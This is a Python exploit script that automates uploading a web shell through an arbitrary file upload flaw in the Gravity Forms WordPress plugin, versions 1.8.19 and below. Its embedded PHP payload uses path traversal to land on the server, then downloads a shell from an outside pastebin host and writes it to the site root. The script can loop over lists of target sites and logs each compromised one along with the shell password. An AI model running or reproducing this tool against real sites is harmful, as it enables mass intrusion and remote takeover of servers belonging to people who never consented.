#!/usr/bin/python
#############################################################################################################
#                           WordPress Plugin Automated Shell uploading                                      #
#                           Gravity Forms [WP] - Arbitrary File Upload                                      #
#                           Vulnerable Version(s) : 1.8.19 (and below)                                      #
# Source : https://blog.sucuri.net/2015/02/malware-cleanup-to-arbitrary-file-upload-in-gravity-forms.html   #
#                                Author: Nasir khan (r0ot h3x49)                                            #
#############################################################################################################
#############################################################################################################
from optparse import *
from urllib2 import *
import sys
try:
    from pycurl import *
    from colorama import init,Fore,Back,Style
except ImportError as e:
    print '[-] -- Import Error: [%s]\n[-] -- Install it (pip install <module_name>)\n' % e
    sys.exit(0)
else:
    init(autoreset = True)
    # colors foreground text:
    fc = Fore.CYAN
    fg = Fore.GREEN
    fw = Fore.WHITE
    fr = Fore.RED
    fb = Fore.BLUE
    # colors style text:
    sd = Style.DIM
    sn = Style.NORMAL
    sb = Style.BRIGHT
#############################################################################################################
# list for saving header response
r = []
# list for saving Status of curl output
st = []
#  connection timeout
tm = 30
#  User Agent
ua = "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0"
# Headers
hd = ['Accept: text/html', 'Accept-Charset: UTF-8']

# php function for uploaading arbitrary file from remote server 
data = '<?php \nfunction http_get($url){ \n\t$c = curl_init($url);\n curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);\n\tcurl_setopt($c, CURLOPT_CONNECTTIMEOUT, 10);\n\tcurl_setopt($c, CURLOPT_FOLLOWLOCATION, 1);\n curl_setopt($c, CURLOPT_HEADER, 0);\n return curl_exec($c);\n \tcurl_close($c);\n }\n $rootFile = $_SERVER["DOCUMENT_ROOT"] . "/r0ot.php" ;\n $Shelltxt = http_get("http://pastebin.com/raw/ewpifhxb");\n $out = fopen($rootFile, "w");\n fwrite($out, $Shelltxt); \n fclose($out);\n if(file_exists($rootFile)){\n     echo $rootFile."</br>";\n }else \n  echo "Failed file not exist";\n echo "Exploited .\n " ;?> &field_id=3&form_id=1&gform_unique_id=../../../&name=r0ot.php5'
'''
<?php 

function http_get($url)
{ 
	$c = curl_init($url);
	curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($c, CURLOPT_CONNECTTIMEOUT, 10);
	curl_setopt($c, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt($c, CURLOPT_HEADER, 0);
	return 
	curl_exec($c);
	curl_close($c);
}

	$rootFile = $_SERVER["DOCUMENT_ROOT"] . "/r0ot.php" ; 
	$Shelltxt = http_get("http://server/shell.txt"); 
	$out = fopen($rootFile, "w");
	fwrite($out, $Shelltxt); 
	fclose($out); 
	if(file_exists($rootFile))
	{     
	echo $rootFile."</br>"; 
	}else 
	echo "Failed to write"; 
	echo "Exploited .\n" ;
?>
'''

# GravityFalls banner taken from "https://www.exploit-db.com/exploits/39969/"
def banner():
    print fc + sb + """+------------------------------------------------------------+
|    _____                 _ _         ______    _ _         | 
|   / ____|               (_) |       |  ____|  | | |        |
|  | |  __ _ __ __ ___   ___| |_ _   _| |__ __ _| | |___     |
|  | | |_ | '__/ _` \ \ / / | __| | | |  __/ _` | | / __|    |
|  | |__| | | | (_| |\ V /| | |_| |_| | | | (_| | | \__ \    |
|   \_____|_|  \__,_| \_/ |_|\__|\__, |_|  \__,_|_|_|___/    |
|                                 __/ |                      |
|                                |___/  - By r0ot h3x49      |
| ---------------------------------------------------------- |
|               WordPress Plugin Gravity Form                |
|         Gravity Forms [WP] - Arbitrary File Upload         |
|              Version(s) : 1.8.19 (and below)               |
+------------------------------------------------------------+"""


##   Function for checking curl status output
def body(buf):
    st.append(buf)
    
##   Function for checking curl headers output
def header(buf):
    r.append(buf)


## Function that Creates and sends curl request using pycurl
def ExploitGravityForm(url, tgt, timeout, ua, head, bodyFunc, headerFunc, PostData):
    try:
        c = Curl()
        c.setopt(URL, url)
        c.setopt(CONNECTTIMEOUT, timeout)
        c.setopt(USERAGENT, ua)
        c.setopt(HTTPHEADER, head)
        c.setopt(WRITEFUNCTION, bodyFunc)
        c.setopt(HEADERFUNCTION, headerFunc)
        c.setopt(POSTFIELDS, PostData)
        c.perform()
    except error as e:
        print fr + sd + '[-] -- Unable to resolve the target '
    else:
        ConfirmExploit(tgt)


##  Function to confirm if target is vulnerable (exploitable) or not 
def ConfirmExploit(tgt):
    if 'http://' in tgt:
        Url = '%s/wp-content/uploads/_input_3_r0ot.php5' % tgt
        ShellUrl = '%s/r0ot.php' % tgt
    elif 'https://' in tgt:
        Url = '%s/wp-content/uploads/_input_3_r0ot.php5' % tgt
        ShellUrl = '%s/r0ot.php' % tgt
    else:
        Url = 'http://%s/wp-content/uploads/_input_3_r0ot.php5' % tgt
        ShellUrl = 'http://%s/r0ot.php' % tgt
        
    resp = r[0]
    status = st[0]
    if '200 OK' in resp and '"status":"ok"' in status:
        print fg + sb + '\n\n---------------------------------------------------------'
        print fw + sd + '[*] -- Exploited sucessfully .. '
        print fw + sd + '[*] -- Execute two or more times manually [%s]' % Url
        print fw + sd + '[*] -- Then check [%s] ' % ShellUrl
        print fw + sd + '[*] -- Shell password : r0ot@h3x49'
        print fg + sb + '---------------------------------------------------------\n\n'
        with open('ExploitableGravityFormTargets.txt','a') as ExploitedTgts:
            ExploitedTgts.write('[*] -- Target  : %s\n[*] -- Exploit : %s\n[*] -- Shell   : %s\n\n' % (tgt,Url,ShellUrl))    
        st[:] = []
        r[:]  = []
    else:
        print fr + sb + '[-] -- Target is not vulnerable to Gravity form exploit'
        st[:] = []
        r[:]  = []



def Main():
    
    banner()
    parser = OptionParser("Usage: %prog [Option] (target/list) ")
    parser.add_option("-u", dest="url", type="string" , \
                      help="Target URL (e.g:- http://abc.com)")
    parser.add_option("-l",dest="List", type="string" , \
                      help="List of URL(s) (e.g:- <filename>.txt)")

    (options, args) = parser.parse_args()
    print fg + sd + '\n----------------------------------------------------------------'
    print fg + sd + ' [*] -- Testing Exploit for wp-gravity form version <= (1.8.19)'
    print fg + sd + '----------------------------------------------------------------\n'
    if not options.url and not options.List:
        print parser.usage
        
    elif options.url and not options.List:

        if 'http://' in options.url:
            url = '%s/?gf_page=upload' % (options.url)
        elif 'https://' in options.url:
            url = '%s/?gf_page=upload' % (options.url)
        else:
            url = 'http://%s/?gf_page=upload' % (options.url)
            
        tgt = options.url
        print fg + sd + '[*] -- Target -->> (%s)' % tgt
        ExploitGravityForm(url, tgt, tm, ua, hd, body, header, data)
        ExploitedTgts.close()
    elif not options.url and options.List:
        f_in = open(options.List)
        ListOftgts = list(line for line in (l.strip() for l in f_in) if line)
        for tgt in  ListOftgts:
            if 'http://' in tgt:
                url = '%s/?gf_page=upload' % (tgt)
            elif 'https://' in tgt:
                url = '%s/?gf_page=upload' % (tgt)
            else:
                url = 'http://%s/?gf_page=upload' % (tgt)

                
            print fg + sd + '[*] -- Target -->> (%s)' % tgt 
            ExploitGravityForm(url, tgt, tm, ua, hd, body, header, data)
        l.close()
        ExploitedTgts.close()
    else:
        pass
    
if __name__ == '__main__':
    try:
        Main()
    except KeyboardInterrupt:
        print fr + sb + '[-] -- User interrupted'
        sys.exit(0)
    except Exception as e:
        pass
